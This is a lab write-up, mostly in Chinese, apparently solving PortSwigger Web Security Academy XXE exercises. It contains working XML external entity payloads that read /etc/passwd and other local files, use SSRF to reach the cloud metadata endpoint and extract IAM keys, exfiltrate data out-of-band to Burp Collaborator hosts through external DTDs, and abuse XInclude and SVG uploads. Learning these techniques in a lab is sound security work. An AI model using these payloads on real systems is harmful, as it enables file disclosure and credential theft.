[TOC]

#### 0. samples

```xml-dtd
POST:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ 
<!ENTITY % file SYSTEM "file:///C:/Users/asus/Desktop/1.txt">
<!ENTITY % remote SYSTEM "http://127.0.0.1:80/1.dtd">
%remote;%init;%send;
]>

1.dtd:
<!ENTITY % init "<!ENTITY % send SYSTEM 'http://3eisdrnsxq6zrx8xz2fskb7gy74zso.burpcollaborator.net?p=%file;'>">
```

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
<!ENTITY xxe SYSTEM "file:///C:/Users/asus/Desktop/1.txt">
]>
<root>&xxe;</root>
```

```xml-dtd
POST:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///C:/Users/asus/Desktop/1.txt">
<!ENTITY % end "]]>">
<!ENTITY % remote SYSTEM "http://192.168.101.6:80/1.dtd">
%remote;%init;%send;
]>

1.dtd：
<!ENTITY % init "<!ENTITY &#37; send SYSTEM 'http://3eisdrnsxq6zrx8xz2fskb7gy74zso.burpcollaborator.net?p=%start;%file;%end;'>">

此时1.txt的文件内容为：
aefasf'<!aew
```

#### 1. Exploiting XXE using external entities to retrieve files

> This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
>
> To solve the lab, inject an XML external entity to retrieve the contents of the `/etc/passwd` file.

这里是直接读取：

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck><productId>&xxe;</productId><storeId></storeId></stockCheck>
```

#### 2. Exploiting XXE to perform SSRF attacks

> In the following XXE example, the external entity will cause the server to make a back-end HTTP request to an internal system within the organization's infrastructure:
> 
> ```
> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
> ```
> The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck><productId>&xxe;</productId><storeId></storeId></stockCheck>
```

返回了："Invalid product ID: latest"

说明下一个端点是`latest`。

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ]>
<stockCheck><productId>&xxe;</productId><storeId></storeId></stockCheck>
```

返回了："Invalid product ID: meta-data"

下一个端点是`meta-data`。如此重复：

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId></storeId></stockCheck>
```

终于得到了隐私数据：

```json
{
  "Code" : "Success",
  "LastUpdated" : "2021-03-04T12:51:59.247978Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "zodWGVQ6CKBdfFlsEnxV",
  "SecretAccessKey" : "Yp60oiSgy08Or8SZIJF0WezmLq8bGsrcJca3NmJC",
  "Token" : "7KK9d7RFwklad1YKdQWClYyDOLoiuatCEYnwrIn2jYxDtCTL5Hby6WtW3PFOAX28GYQEKP2fiGpNBXWErJF60HMuH9CI08E7NwVpOelqUkhRSszL8aeZy3DIpi9eahldQzHYdLvAnYOJ0L2xLToH3SJjoGwrIfqx59JpwiR9NzhMGnEHw7s60nYCue4DDpetKqXNKhjuZ1Fwix5RU2lpLZ1toSBrkJ8oVAebPcFn4HdfunTZC5Afc2DXcRaQXDQq",
  "Expiration" : "2027-03-03T12:51:59.247978Z"
}
```

得到了`AccessKeyId : zodWGVQ6CKBdfFlsEnxV`

#### 3. Blind XXE with out-of-band interaction

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ 
<!ENTITY remote SYSTEM "http://rb6bjptx2t6bbqrzsflviaktokuaiz.burpcollaborator.net">
]>
<stockCheck><productId>&remote;</productId><storeId>1</storeId></stockCheck>
```

完成。

#### 4. Blind XXE with out-of-band interaction via XML parameter entities

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ 
<!ENTITY remote SYSTEM "http://6mtaeqqnawen8cgx8t3j6jvi79dz1o.burpcollaborator.net">
]>
<stockCheck><productId>&remote;</productId><storeId>1</storeId></stockCheck>
```

用上面这个被禁了，但是用下面这个发现可以。

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ 
<!ENTITY remote SYSTEM "http://6mtaeqqnawen8cgx8t3j6jvi79dz1o.burpcollaborator.net">
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

说明不能在下面用实体。改用参数形式。

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ 
<!ENTITY % remote SYSTEM "http://6mtaeqqnawen8cgx8t3j6jvi79dz1o.burpcollaborator.net">
%remote;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

成功。

#### 5. Exploiting blind XXE to exfiltrate data using a malicious external DTD

> To solve the lab, exfiltrate the contents of the `/etc/hostname` file.

```xml-dtd
POST:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % init "<!ENTITY &#37; send SYSTEM 'http://jm9ne3q0a9e08pga863w6wvv7mde13.burpcollaborator.net?p=%file;'>">
%init;
%send;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

先用这个尝试一下。

发现不行，尝试用外部的dtd。

```xml-dtd
POST:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
<!ENTITY % remote SYSTEM "http://192.168.1.50:80/1.dtd">
%remote;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>

1.dtd：
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % init "<!ENTITY &#37; send SYSTEM 'http://am0p86ohlc5bl062kqoo7y93vu1kp9.burpcollaborator.net?p=%file;'>">
%init;
%send;
```

我发现这样会卡很久，就好像无法连接我的phpstudy。我的collaborator也收不到任何信息。

然后这个时候我才发现官方给了一个exploit。

```xml-dtd
POST:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
<!ENTITY % remote SYSTEM "https://acde1f701f6b5c07808708840134003f.web-security-academy.net/exploit">
%remote;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>

exploit:
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % init "<!ENTITY &#37; send SYSTEM 'http://am0p86ohlc5bl062kqoo7y93vu1kp9.burpcollaborator.net?p=%file;'>">
%init;
%send;
```

这下响应就很快了，立即得到了答案。

#### 6. Exploiting blind XXE to retrieve data via error messages

这道题目要求用DTD去触发错误信息，并且显示`/etc/passwd`的内容。

因为服务器会返回错误消息。

POC:

```xml-dtd
POST:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
<!ENTITY % remote SYSTEM "https://acbf1f991e6da36180f84667013b0063.web-security-academy.net/exploit">
%remote;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>

exploit:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#37; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

成功读取。

#### 7. Exploiting XXE to retrieve data by repurposing a local DTD

> Systems using the GNOME desktop environment often have a DTD at `/usr/share/yelp/dtd/docbookx.dtd` containing an entity called `ISOamso`.

因为这个dtd是本地的文件，并且里面有`ISPamso`，并且使用错误信息，那么可以编写下面的xml文档。

```xml-dtd
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM \'file:///nonexistent/%file;\'>">
%eval;
%error;
'>
%local_dtd;
]>
```

又因为这个要经过两次解析：

* 第一次解析是调用local_dtd的时候，所以里面的`%`都需要转义，而且xml不太支持反斜杠转义，里面的单引号也得用HTML实体编码。

    ```xml-dtd
    <!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    '>
    %local_dtd;
    ]>
    ```

* 然后调用`ISOamso`之后，就会进行第二次解析。

    解析之后里面的部分就会变成：

    ```xml-dtd
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;
    ```

    这里显然eval里面的部分不符合规范，所以`% error`里面的`%`需要进行二次HTML实体编码。

    所以最终payload是：

    ```xml-dtd
    <!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;&#x23;&#x78;&#x32;&#x35;&#x3b; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    '>
    %local_dtd;
    ]>
    ```

#### 8. Exploiting XInclude to retrieve files

> To perform an `XInclude` attack, you need to reference the `XInclude` namespace and provide the path to the file that you wish to include. For example:
>
> ```xml
> <foo xmlns:xi="http://www.w3.org/2001/XInclude">
> <xi:include parse="text" href="file:///etc/passwd"/></foo>
> ```

所以这里尝试使用上面的payload，因为这里是用的参数传递，所以进行了一次url编码。

```
productId=%3c%66%6f%6f%20%78%6d%6c%6e%73%3a%78%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%49%6e%63%6c%75%64%65%22%3e%3c%78%69%3a%69%6e%63%6c%75%64%65%20%70%61%72%73%65%3d%22%74%65%78%74%22%20%68%72%65%66%3d%22%66%69%6c%65%3a%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64%22%2f%3e%3c%2f%66%6f%6f%3e&storeId=1
```

可以直接通过。

#### 9. Exploiting XXE via image file upload

**要求：**

> This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.
>
> To solve the lab, upload an image that displays the contents of the `/etc/hostname` file after processing. Then use the "Submit solution" button to submit the value of the server hostname.

> Even if the application expects to receive a format like PNG or JPEG, the image processing library that is being used might support SVG images. Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities.

这里尝试使用SVG图像。

去网上搜了一下[如何创建一个svg图像](https://www.runoob.com/svg/svg-example.html)。

找到一个实例。

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <circle cx="100" cy="50" r="40" stroke="black"
  stroke-width="2" fill="red" />
</svg>
```

> 第一行包含了 XML 声明。请注意 standalone 属性！该属性规定此 SVG 文件是否是"独立的"，或含有对外部文件的引用。
>
> standalone="no" 意味着 SVG 文档会引用一个外部文件 - 在这里，是 DTD 文件。

然后修修改改，向里面注入了xml代码。这里我们不需要引入dtd文件，所以需要将`standalone`属性改成`yes`。

我还在里面添加了一行文字来承载文件

```html
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE root[
<!ENTITY xxe SYSTEM "file:///etc/hostname">
]>

<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <circle cx="100" cy="50" r="40" stroke="black"
  stroke-width="2" fill="red" />
    <text x="100" y="100" fill="black">&xxe;</text>
</svg>
```

我这样写发现根本看不清楚字母。我之后就将圆圈删了，然后将字的大小调大。

将字体大小调整到30之后终于能够看清楚了。

```html
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE root[
<!ENTITY xxe SYSTEM "file:///etc/hostname">
]>

<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
<text font-size="30" x="100" y="100" fill="black">&xxe;</text>
</svg>
```

最后得到答案：`5d11b7912351`